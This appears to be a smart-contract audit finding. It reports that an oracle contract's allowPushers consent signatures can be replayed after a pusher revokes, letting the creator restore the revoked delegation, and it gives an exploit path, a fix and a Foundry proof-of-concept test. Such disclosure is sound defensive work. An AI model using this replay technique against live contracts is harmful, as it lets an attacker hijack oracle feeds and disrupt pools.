Audit Report

## Title
`allowPushers` consent signature replay after `revokePusher` re-establishes revoked delegation — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

## Summary
`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but records no used-signature state and includes no per-pusher nonce. The sole replay barrier is the deadline check in `_ensureDeadline`. After a pusher self-revokes via `revokePusher`, the namespace creator can call `allowPushers` again with the identical `(deadline, pushers, signatures)` arguments — provided the deadline has not expired — silently restoring the delegation and redirecting all subsequent pushes into the creator's namespace instead of the pusher's own.

## Finding Description
`allowPushers` (L192–212) constructs the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
```

There is no nonce, no per-pusher sequence counter, and no `usedSignatures` mapping. The only guard is `_ensureDeadline` (OracleBase.sol L124–126), which passes for any call where `block.timestamp <= deadline`.

`revokePusher` (L238–243) sets `namespaceRemapping[msg.sender] = address(0)`. This write is the entire revocation mechanism — there is no signature invalidation. Because the signed digest does not change between the first and second `allowPushers` call (same `deadline`, same `pusher`, same `msg.sender`), ECDSA recovery succeeds identically on replay, and `namespaceRemapping[pusher] = msg.sender` is written again, exactly reversing the revocation.

The code's own comment at L186–191 acknowledges the deadline is the sole replay barrier, but a signature with a future deadline is replayable at any point within that window.

Exploit path:
1. Pusher signs consent for creator with `deadline = block.timestamp + 365 days`.
2. Creator calls `allowPushers` — `namespaceRemapping[pusher] = creator`.
3. Pusher calls `revokePusher` — `namespaceRemapping[pusher] = address(0)`.
4. Creator calls `allowPushers` again with the identical arguments — both `_ensureDeadline` and ECDSA recovery pass; `namespaceRemapping[pusher] = creator` is written again.
5. All subsequent `fallback()` pushes from the pusher's address are routed to the creator's namespace (L315–316).

## Impact Explanation
After re-delegation, the pusher's `fallback()` calls write into the creator's namespace storage slot, not the pusher's own. The pusher's own `feedId` (keyed by `pusher` address) is never updated — its stored timestamp remains 0. Every consumer that reads `getOracleData(feedIdOf(pusher, slotIndex, positionIndex))` receives `timestampMs = 0`, which is rejected as stale, causing bad-price execution or a complete halt of swaps on any pool bound to the pusher's feed. Simultaneously, the creator's pool receives oracle data it was not supposed to receive after revocation, constituting unauthorized oracle data injection into a live pool's price feed. This meets the bad-price execution and broken core pool functionality impact criteria.

## Likelihood Explanation
The creator retains the pusher's consent signature bytes after the initial `allowPushers` call — no additional key material is needed. Deadlines are caller-controlled and can be set arbitrarily far in the future. The replay requires only the creator's EOA and the stored signature. The pusher has no on-chain mechanism to invalidate the old signature before the deadline expires. Any creator who wishes to prevent a pusher from operating independently after revocation can replay at any time within the deadline window.

## Recommendation
Add a per-pusher nonce to the signed message and increment it on each successful delegation:

```solidity
mapping(address pusher => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

Alternatively, maintain a `mapping(bytes32 => bool) usedSignatures` and mark each digest consumed after first use, preventing any signature from being accepted more than once regardless of deadline.

## Proof of Concept

```solidity
function test_allowPushers_replayAfterRevoke() public {
    uint256 deadline = block.timestamp + 365 days;

    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers_ = new address[](1);
    pushers_[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // Step 1: initial delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 2: pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // Step 3: creator replays identical signature — succeeds, revocation undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // Step 4: pusher's subsequent pushes land in creator's namespace
    // pusher's own feedId reads timestamp=0 → stale → pool halted / bad-price execution
}
```
